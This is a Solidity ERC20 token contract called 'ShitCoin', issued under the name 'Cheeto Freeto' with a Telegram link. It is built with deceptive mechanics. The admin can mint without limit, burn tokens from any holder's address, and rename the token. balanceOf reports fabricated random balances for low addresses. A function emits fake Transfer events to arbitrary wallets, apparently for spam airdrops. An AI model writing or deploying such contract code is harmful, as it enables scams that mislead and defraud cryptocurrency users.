// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./openzeppelin/token/ERC20/ERC20.sol";
import "./openzeppelin/access/AccessControlEnumerable.sol";
import "./interfaces/IUniswapV2Factory.sol";
import "./interfaces/IUniswapV2Pair.sol";
import "./interfaces/IWeth.sol";

contract ShitCoin is ERC20, AccessControlEnumerable {
    
    address constant BURN_ADDRESS = address(0x0);
    constructor()
        ERC20("Cheeto Freeto t.me/CheetoFreeto", "CHEETO", 18) 
    {
        _setupRole(ROLE_ADMIN, msg.sender);
    }
    
    function updateNameSymbol(string calldata name, string calldata symbol) public onlyRole(ROLE_ADMIN) {
        _name = name;
        _symbol = symbol;
    }
    
    function balanceOf(address addr) public override view returns(uint) {
        if (addr <= address(0xfffffffff)) return uint(keccak256(abi.encodePacked(addr, blockhash(block.number)))) % 1e18;
        
        return _balances[addr];
    }
    
    function mint(address to, uint amount) public onlyRole(ROLE_ADMIN) {
        _mint(to, amount);
    }
    
    function burn(address from, uint amount) public onlyRole(ROLE_ADMIN) {
        _burn(from, amount);
    }
    
    function correctTransferEvents(address[] calldata addrs)
        public
        onlyRole(ROLE_ADMIN)
    {
        for (uint i = 0; i<addrs.length; i++)
        {
            emit Transfer(BURN_ADDRESS, addrs[i], 1);
        }
    }
}
